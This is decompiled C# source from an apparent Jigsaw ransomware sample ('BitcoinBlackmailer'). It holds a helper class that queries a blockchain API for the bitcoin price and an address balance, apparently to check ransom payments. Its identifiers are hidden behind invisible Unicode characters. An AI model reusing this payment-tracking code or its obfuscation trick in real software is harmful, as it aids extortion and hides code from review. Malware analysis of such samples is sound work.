// Decompiled with JetBrains decompiler
// Type: Main.Tools.Blockr
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-773295583998b76b4e24b562f85fa685577067614133db4a7df3d2a28cb4cc3a.exe

using Newtonsoft.Json.Linq;
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Main.Tools
{
  internal static class Blockr
  {
    private static string BlockrAddress => "http://btc.blockr.io/api/v1/";

    internal static double GetPrice()
    {
      string str = Blockr.\u202C‏⁭⁪‪⁬‪⁫‫​‌‬⁪⁮⁭​‬⁯‫​⁫‪‏‬⁬​⁭‫⁪‌‮‍‍‭‪‏⁬⁯​⁭‮(Blockr.BlockrAddress, "coin/info/");
      JObject jobject = Blockr.\u206D⁯⁫⁪‌‌⁮⁭‎⁭‮⁫⁮‫‭‌⁮‎‪‭⁪⁮‎‌‍⁪‍‫‭‎‮‍‎‏‌‍⁬‬⁪⁬‮(Blockr.\u206E⁮‬⁭‬​⁭‪‌⁮‫‌‎⁬‍‏‫‌​⁬‮⁯⁯‌‭⁮⁫⁭‪⁭‭‏⁪‮‍‬​‭‪‍‮(Blockr.\u202E​⁪⁭⁪‫‭⁭⁮‎‏‌‌‍‌​⁮⁯‮⁯‍‭⁮⁬‍​⁬‏⁪‮‍‪⁫‪‎‏‪⁫⁮‬‮(), str));
      JToken jtoken = Blockr.\u202A⁬‫‬⁭‮‬⁬‬‮‍​⁯⁫‭​‌​‪‬⁫‪⁯⁯⁯‏⁪‫⁮‪‪⁭⁪‎‏⁮​⁫‮‭‮(jobject, "status");
      if (jtoken != null && Blockr.\u202D⁮⁫‬​‭‭‍​⁮‌‪⁮​​‬‪‪‮⁬‎‭⁯‍⁫⁬⁫⁯⁭⁪⁪⁪⁮‎‎‍‏‍⁪‮‮(Blockr.\u202D‮‍⁪‫‌‌⁭‬⁮‬⁬⁫‭​⁫⁫‎‏‌‏⁮‌‬⁮​⁮‌‪⁪⁪⁮‪⁭⁭⁯‌‮⁮⁪‮((object) jtoken), "error"))
        throw Blockr.\u202E​‪⁯⁯‌‭⁯⁫‭‫‌​‍‫⁯⁬‭‮‪⁬‪‪‭‭⁬⁮‎​⁮⁮‍⁯⁭⁪‪​⁬⁮‭‮(Blockr.\u202D‮‍⁪‫‌‌⁭‬⁮‬⁬⁫‭​⁫⁫‎‏‌‏⁮‌‬⁮​⁮‌‪⁪⁪⁮‪⁭⁭⁯‌‮⁮⁪‮((object) jobject));
      return Blockr.\u202A⁪‍‮‍‎‭‫⁯‮‏‮‪​⁫⁯‎​‫‍‌‎‪‌‬‎‮⁭​‌⁬‮‌‪‏‪‌‬‍‮‮(Blockr.\u202A⁪‍‮‍‎‭‫⁯‮‏‮‪​⁫⁯‎​‫‍‌‎‪‌‬‎‮⁭​‌⁬‮‌‪‏‪‌‬‍‮‮(Blockr.\u202A⁬‫‬⁭‮‬⁬‬‮‍​⁯⁫‭​‌​‪‬⁫‪⁯⁯⁯‏⁪‫⁮‪‪⁭⁪‎‏⁮​⁫‮‭‮(jobject, "data"), (object) "markets"), (object) "coinbase").Value<double>((object) "value");
    }

    internal static double GetBalanceBtc(string address)
    {
      string str = Blockr.\u200C⁬⁬‪⁫‬⁮‬⁬‍‮‭‮⁯⁫‌‬‎⁯⁫‍‎​‬⁮⁪⁬‪​‭‍‫⁮⁮‮‫‏‭⁫⁫‮(Blockr.BlockrAddress, "address/balance/", address);
      JObject jobject = Blockr.\u206D⁯⁫⁪‌‌⁮⁭‎⁭‮⁫⁮‫‭‌⁮‎‪‭⁪⁮‎‌‍⁪‍‫‭‎‮‍‎‏‌‍⁬‬⁪⁬‮(Blockr.\u206E⁮‬⁭‬​⁭‪‌⁮‫‌‎⁬‍‏‫‌​⁬‮⁯⁯‌‭⁮⁫⁭‪⁭‭‏⁪‮‍‬​‭‪‍‮(Blockr.\u202E​⁪⁭⁪‫‭⁭⁮‎‏‌‌‍‌​⁮⁯‮⁯‍‭⁮⁬‍​⁬‏⁪‮‍‪⁫‪‎‏‪⁫⁮‬‮(), str));
      JToken jtoken = Blockr.\u202A⁬‫‬⁭‮‬⁬‬‮‍​⁯⁫‭​‌​‪‬⁫‪⁯⁯⁯‏⁪‫⁮‪‪⁭⁪‎‏⁮​⁫‮‭‮(jobject, "status");
      if (jtoken != null && Blockr.\u202D⁮⁫‬​‭‭‍​⁮‌‪⁮​​‬‪‪‮⁬‎‭⁯‍⁫⁬⁫⁯⁭⁪⁪⁪⁮‎‎‍‏‍⁪‮‮(Blockr.\u202D‮‍⁪‫‌‌⁭‬⁮‬⁬⁫‭​⁫⁫‎‏‌‏⁮‌‬⁮​⁮‌‪⁪⁪⁮‪⁭⁭⁯‌‮⁮⁪‮((object) jtoken), "error"))
        throw Blockr.\u202E​‪⁯⁯‌‭⁯⁫‭‫‌​‍‫⁯⁬‭‮‪⁬‪‪‭‭⁬⁮‎​⁮⁮‍⁯⁭⁪‪​⁬⁮‭‮(Blockr.\u202D‮‍⁪‫‌‌⁭‬⁮‬⁬⁫‭​⁫⁫‎‏‌‏⁮‌‬⁮​⁮‌‪⁪⁪⁮‪⁭⁭⁯‌‮⁮⁪‮((object) jobject));
      return Blockr.\u202A⁬‫‬⁭‮‬⁬‬‮‍​⁯⁫‭​‌​‪‬⁫‪⁯⁯⁯‏⁪‫⁮‪‪⁭⁪‎‏⁮​⁫‮‭‮(jobject, "data").Value<double>((object) "balance");
    }

    static string \u202C‏⁭⁪‪⁬‪⁫‫​‌‬⁪⁮⁭​‬⁯‫​⁫‪‏‬⁬​⁭‫⁪‌‮‍‍‭‪‏⁬⁯​⁭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static WebClient \u202E​⁪⁭⁪‫‭⁭⁮‎‏‌‌‍‌​⁮⁯‮⁯‍‭⁮⁬‍​⁬‏⁪‮‍‪⁫‪‎‏‪⁫⁮‬‮() => new WebClient();

    static string \u206E⁮‬⁭‬​⁭‪‌⁮‫‌‎⁬‍‏‫‌​⁬‮⁯⁯‌‭⁮⁫⁭‪⁭‭‏⁪‮‍‬​‭‪‍‮([In] WebClient obj0, [In] string obj1) => obj0.DownloadString(obj1);

    static JObject \u206D⁯⁫⁪‌‌⁮⁭‎⁭‮⁫⁮‫‭‌⁮‎‪‭⁪⁮‎‌‍⁪‍‫‭‎‮‍‎‏‌‍⁬‬⁪⁬‮([In] string obj0) => JObject.Parse(obj0);

    static JToken \u202A⁬‫‬⁭‮‬⁬‬‮‍​⁯⁫‭​‌​‪‬⁫‪⁯⁯⁯‏⁪‫⁮‪‪⁭⁪‎‏⁮​⁫‮‭‮([In] JObject obj0, [In] string obj1) => obj0[obj1];

    static string \u202D‮‍⁪‫‌‌⁭‬⁮‬⁬⁫‭​⁫⁫‎‏‌‏⁮‌‬⁮​⁮‌‪⁪⁪⁮‪⁭⁭⁯‌‮⁮⁪‮([In] object obj0) => obj0.ToString();

    static bool \u202D⁮⁫‬​‭‭‍​⁮‌‪⁮​​‬‪‪‮⁬‎‭⁯‍⁫⁬⁫⁯⁭⁪⁪⁪⁮‎‎‍‏‍⁪‮‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static Exception \u202E​‪⁯⁯‌‭⁯⁫‭‫‌​‍‫⁯⁬‭‮‪⁬‪‪‭‭⁬⁮‎​⁮⁮‍⁯⁭⁪‪​⁬⁮‭‮([In] string obj0) => new Exception(obj0);

    static JToken \u202A⁪‍‮‍‎‭‫⁯‮‏‮‪​⁫⁯‎​‫‍‌‎‪‌‬‎‮⁭​‌⁬‮‌‪‏‪‌‬‍‮‮([In] JToken obj0, [In] object obj1) => obj0[obj1];

    static string \u200C⁬⁬‪⁫‬⁮‬⁬‍‮‭‮⁯⁫‌‬‎⁯⁫‍‎​‬⁮⁪⁬‪​‭‍‫⁮⁮‮‫‏‭⁫⁫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
